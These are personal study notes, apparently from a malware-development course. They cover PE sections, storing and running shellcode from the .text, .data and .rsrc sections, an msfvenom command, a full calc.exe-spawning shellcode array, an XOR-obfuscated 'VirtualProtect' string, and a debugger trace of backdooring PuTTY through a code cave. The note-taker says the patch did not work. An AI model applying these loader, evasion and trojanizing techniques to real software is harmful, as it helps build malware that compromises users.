Hasherzade - creates really interesting tools.

6 different section -

.text

.rdata

.data

.pdata

.rsrc

.reloc


dumpbin in windows also performs the same activity as the metadata

 headers - metadata
 section - content of PE

we can make dll through clang
`
//cl.exe /D_USRDLL /D_WINDLL stand_in_app.cpp /MT /link /DLL /OUT:implant.dll`

### places to put your payload

in order to put shellcode in text section we need to put it in someplace like `.text` section that is the main program.

to put it in data we need to tell the compiler that `.shellcode` is read only memory

to put in `.rsrc` section,  we need to use certain api calls to call the shellcoden 

### putting payload in  data section

our variable ended in the data section because we delared it as a global variable.

![](control_to_debugger.png)

looking at the address
38a000 addr of payload
7d0000 exec memory address

### putting into text section

you need to put your payload inside main itself.

addr of payload      : 0x006FFB8C
exec_mem addr        : 0x00740000

Hit me!

after changin it ot (voiid *)

addr of payload      : 0x0113FDE8
exec_mem addr        : 0x01160000

Address  Data       
00940001 90 90 CC C3
00B63019 90 90 CC C3


looking at all addresses we got

```cpp
exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n",  "addr of void * payload", (void *)payload);
	printf("%-20s : 0x%-016p\n", "payload & addr", &payload);
	printf("%-20s : 0x%-016p\n", "payload addr", payload);

	printf("%-20s : 0x%-016p\n", "exec_mem void * addr", (void *)exec_mem);
	printf("%-20s : 0x%-016p\n", "exec_mem  addr", exec_mem);
	printf("%-20s : 0x%-016p\n", "exec_mem &  addr", &exec_mem);

```
   
```
addr of void * payload : 0x009EF7F8
payload & addr       : 0x009EF7F8
payload addr         : 0x009EF7F8
exec_mem void * addr : 0x00D40000
exec_mem  addr       : 0x00D40000
exec_mem &  addr     : 0x009EF7F0

Hit me!
```

compile bat -

compiling
```
@ECHO OFF
rc resources.rc
cvtres /MACHINE:x64 /OUT:resources.o resources.res
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
```

resources section
``
#include "resources.h"

FAVICON_ICO RCDATA calc.ico

```

resources.h - `#define calc_ico 100`

create a calc.ico - calc.ico has execuatable code for meterpreter in calc.exe.

The shellcode ot spawn calc.exe - `msfvenom -p windows/exec CMD=calc.exe -b "x00" -f py`

### video 15

```
//from https://packetstormsecurity.com/files/156478/Windows-x86-Null-Free-WinExec-Calc.exe-Shellcode.html

char shellcode[] =
"\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"
"\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"
"\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"
"\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"
"\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"
"\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"
"\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"
"\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"
"\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"
"\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff"
"\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f"
"\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2"

```

In video 15 we are trying to write our own vutual protect function in order to make it work.

ciphertext for VirtualProtect - `{ 0x17, 0x2b, 0x31, 0x30, 0x30, 0x27, 0x2b, 0x18, 0x3b, 0x25, 0x3f, 0x29, 0x2e, 0x3a };`

### video 16

backdooring PE files - patching

methods -
 code cave, new section and extending section in code itself.

### video 17

backdooring putty -

attach the exe to the debugger and look in text section for empty spaces like 000

for 32 bit putty:

002D5CA | E8 9A020000              | call putty.2D5F3F                       |

code cave address : 0x62197D34

002D5F3 | 8B0D 74103200            | mov ecx,dword ptr ds:[321074]           | ecx:EntryPoint
002D5F4 | 56                       | push esi                                | esi:EntryPoint
002D5F4 | 57                       | push edi                                | edi:EntryPoint
002D5F4 | BF 4EE640BB              | mov edi,BB40E64E                        | edi:EntryPoint
002D5F4 | BE 0000FFFF              | mov esi,FFFF0000                        | esi:EntryPoint
002D5F5 | 3BCF                     | cmp ecx,edi                             | ecx:EntryPoint, edi:EntryPoint
002D5F5 | 74 04                    | je putty.2D5F59                         |
002D5F5 | 85CE                     | test esi,ecx                            | esi:EntryPoint, ecx:EntryPoint
002D5F5 | 75 26                    | jne putty.2D5F7F                        |

`\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2\x52\xff\xd0`

call that brings up calculator - 62197DE | E8 87FFFFFF              | call comctl32.62197D7B                  |

it is not working th epatching is not happening properly for the executed program, even after saving patches calculator is not called.
need to try it in the ovf tommorrow.

